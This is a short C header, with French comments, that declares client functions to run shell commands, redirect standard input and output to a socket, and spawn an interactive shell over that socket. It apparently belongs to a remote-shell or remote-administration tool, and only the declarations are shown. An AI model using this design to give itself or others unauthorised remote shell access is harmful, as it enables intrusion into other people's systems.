#ifndef CLIENT_COMMANDS_H
#define CLIENT_COMMANDS_H

#include "../utils/common.h"

// Exécuter une commande shell et retourner le résultat
int execute_command(const char *cmd, char *output, size_t max_output);

// Rediriger stdin/stdout/stderr vers un socket
int redirect_io_to_socket(int sock);

// Lancer shell interactif
int spawn_shell(int sock);

#endif // CLIENT_COMMANDS_H

